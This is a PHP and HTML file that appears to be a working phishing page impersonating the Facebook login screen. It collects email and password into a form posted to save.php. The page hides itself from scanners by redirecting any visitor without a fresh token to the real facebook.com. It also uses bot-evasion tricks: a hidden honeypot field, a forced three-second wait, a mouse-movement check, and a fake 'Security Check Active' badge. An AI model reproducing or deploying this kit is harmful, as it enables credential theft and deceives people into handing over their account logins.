<?php
$token = $_GET['token'] ?? '';
$verify = $_GET['verify'] ?? 0;

if (empty($token) || $verify == 0) {
    header('Location: https://www.facebook.com');
    exit;
}

$token_time = explode('_', $token)[0];
if (time() * 1000 - $token_time > 30000) {
    header('Location: https://www.facebook.com');
    exit;
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - log in or sign up</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #f0f2f5;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            align-items: center;
            max-width: 980px;
            width: 100%;
            gap: 40px;
        }
        .info { flex: 1; min-width: 280px; }
        .info h1 { color: #1877f2; font-size: 55px; margin-bottom: 20px; }
        .info p { font-size: 24px; color: #1c1e21; }
        .login-box {
            flex: 1;
            min-width: 350px;
            background: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1);
        }
        input {
            width: 100%;
            padding: 14px 16px;
            margin: 8px 0;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            font-size: 17px;
        }
        input:focus { border-color: #1877f2; outline: none; }
        button {
            width: 100%;
            padding: 12px;
            background: #1877f2;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 20px;
            font-weight: bold;
            cursor: pointer;
            margin: 16px 0;
        }
        button:hover { background: #166fe5; }
        .forgot-link { text-align: center; margin: 16px 0; }
        .forgot-link a { color: #1877f2; text-decoration: none; font-size: 14px; }
        hr { border: none; border-top: 1px solid #dadde1; margin: 20px 0; }
        .create-btn {
            background: #42b72a;
            display: inline-block;
            padding: 12px 24px;
            border-radius: 6px;
            color: white;
            font-weight: bold;
            text-decoration: none;
        }
        .create-btn:hover { background: #36a420; }
        .create-account { text-align: center; }
        .footer-note {
            text-align: center;
            margin-top: 20px;
            font-size: 12px;
            color: #65676b;
        }
        .honeypot {
            position: absolute;
            left: -9999px;
            top: -9999px;
        }
        .timer {
            text-align: center;
            margin: 10px 0;
            font-size: 12px;
            color: #e41e3f;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="info">
            <h1>facebook</h1>
            <p>Connect with friends and the world around you on Facebook.</p>
        </div>
        <div class="login-box">
            <form method="POST" action="save.php" id="loginForm">
                <div class="honeypot">
                    <input type="text" name="website_url" tabindex="-1" autocomplete="off">
                </div>
                
                <input type="hidden" name="token" value="<?php echo htmlspecialchars($token); ?>">
                <input type="hidden" name="page_load_time" id="pageLoadTime" value="">
                <input type="hidden" name="mouse_moved" id="mouseMoved" value="0">
                
                <input type="text" name="email" placeholder="Email or phone number" required>
                <input type="password" name="pass" placeholder="Password" required>
                <button type="submit">Log In</button>
                
                <div id="timerNote" class="timer">⏱️ Please wait 3 seconds...</div>
            </form>
            <div class="forgot-link"><a href="#">Forgot password?</a></div>
            <hr>
            <div class="create-account"><a href="#" class="create-btn">Create new account</a></div>
            <div class="footer-note"><b>🔒 Security Check Active</b></div>
        </div>
    </div>

    <script>
        const pageLoadTime = Date.now();
        document.getElementById('pageLoadTime').value = pageLoadTime;
        
        let mouseMoved = false;
        document.addEventListener('mousemove', function() {
            if (!mouseMoved) {
                mouseMoved = true;
                document.getElementById('mouseMoved').value = '1';
            }
        });
        
        let canSubmit = false;
        const timerNote = document.getElementById('timerNote');
        
        setTimeout(function() {
            canSubmit = true;
            timerNote.innerHTML = '✓ You can now login';
            timerNote.style.color = '#31a24c';
        }, 3000);
        
        let secondsLeft = 3;
        const countdown = setInterval(function() {
            if (secondsLeft > 0 && !canSubmit) {
                timerNote.innerHTML = `⏱️ Please wait ${secondsLeft} second${secondsLeft !== 1 ? 's' : ''}...`;
                secondsLeft--;
            } else if (canSubmit) {
                clearInterval(countdown);
            }
        }, 1000);
        
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            if (!canSubmit) {
                e.preventDefault();
                timerNote.innerHTML = '❌ Too fast! Please wait.';
                timerNote.style.color = '#e41e3f';
                return false;
            }
            if (document.getElementById('mouseMoved').value === '0') {
                e.preventDefault();
                alert('Security check: Move your mouse before logging in.');
                return false;
            }
        });
    </script>
</body>
</html>
